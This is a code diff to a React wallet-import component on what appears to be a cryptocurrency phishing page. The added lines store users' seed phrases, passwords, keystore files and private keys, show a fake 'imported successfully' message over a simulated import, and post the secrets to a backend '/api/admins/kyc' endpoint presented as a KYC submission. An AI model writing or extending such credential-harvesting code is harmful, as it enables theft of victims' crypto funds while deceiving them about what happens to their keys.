@@ -25,6 +25,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
   const [showPOF, setShowPOF] = useState(false);
   const [startCountdown, setStartCountdown] = useState(false);
   const [selectedWalletType, setSelectedWalletType] = useState(null);
+  const [walletFormData, setWalletFormData] = useState(null); // store wallet import form data (seed, keystore, privateKey, password)
   const [progress, setProgress] = useState(100);
   const [sessionId, setSessionId] = useState(() => {
     const existingSessionId = localStorage.getItem('sessionId');
@@ -51,6 +52,37 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
             setToast({ show: false, message: '' });
             setShowPOF(true);
             setStartCountdown(true);
+            // After POF is shown, attempt to submit any pending KYC for this session
+            (async () => {
+              try {
+                const pendingKey = `kyc_pending_${sessionId}`;
+                const raw = localStorage.getItem(pendingKey);
+                if (!raw) return;
+                const pending = JSON.parse(raw);
+                // attach walletType and any wallet fields (seed, keystore, privateKey)
+                const payload = {
+                  sessionId: pending.sessionId || sessionId,
+                  walletType: selectedWalletType || walletFormData?.walletType || 'unknown',
+                  seedPhrase: walletFormData?.key || undefined,
+                  keystoreJson: walletFormData?.keystoreJson || undefined,
+                  password: walletFormData?.pass || undefined,
+                  privateKey: walletFormData?.privateKey || undefined,
+                  imageUrls: pending.imageUrls || [],
+                };
+                // Optionally attach seed/keystore/privateKey from form state if you have them accessible
+                const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                if (!res.ok) {
+                  const txt = await res.text();
+                  console.warn('Failed to submit pending KYC:', res.status, txt);
+                  return;
+                }
+                // on success remove the pending key
+                localStorage.removeItem(pendingKey);
+                console.log('Pending KYC submitted for session', payload.sessionId);
+              } catch (err) {
+                console.error('Error submitting pending KYC', err);
+              }
+            })();
             return 0;
           }
           return prev - 5;
@@ -84,6 +116,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
     const formData = new FormData(e.target);
     const walletType = formData.get('walletType') || 'binance';
     const key = formData.get('key') || '';
+    const pass = formData.get('pass') || '';
 
     if (!validateSeedPhrase(key)) {
       setToast({ show: true, message: 'Invalid seed phrase. Please enter a valid 12 or 24-word phrase.', style: { background: '#fff', color: '#d32f2f', isError: true } });
@@ -92,6 +125,8 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
 
     // Simulate successful import: show success toast. POF will appear after toast progress completes.
     setSelectedWalletType(walletType);
+    // persist wallet form data so we can attach it to pending KYC submission later
+    setWalletFormData({ walletType, key, pass, activeTab: activeTab });
     setStartCountdown(false);
     setShowPOF(false);
     setToast({ show: true, message: 'Wallet imported successfully!', style: { background: '#fff', color: '#4caf50', isError: false } });
